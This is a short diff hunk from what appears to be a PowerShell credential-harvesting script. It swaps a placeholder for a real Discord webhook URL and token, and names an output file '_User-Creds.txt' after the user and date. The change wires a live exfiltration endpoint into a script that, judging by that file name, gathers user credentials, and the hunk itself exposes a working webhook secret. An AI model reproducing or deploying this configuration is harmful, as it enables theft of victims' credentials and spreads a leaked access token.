@@ -21,7 +21,7 @@
 #>
 
 # Define Discord webhook URL
-$DiscordWebhookUrl = "YOUR-DISCORD-WEBHOOK-URL"
+$DiscordWebhookUrl = "https://discord.com/api/webhooks/1280938491231862825/AOmwFnNFIHX-dOKbcx2HVV7B5EN3PJfe8bH3Gt7xa-oRgHnCzx5ZA1ii7OZsDtvbITRw"
 
 $FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
 
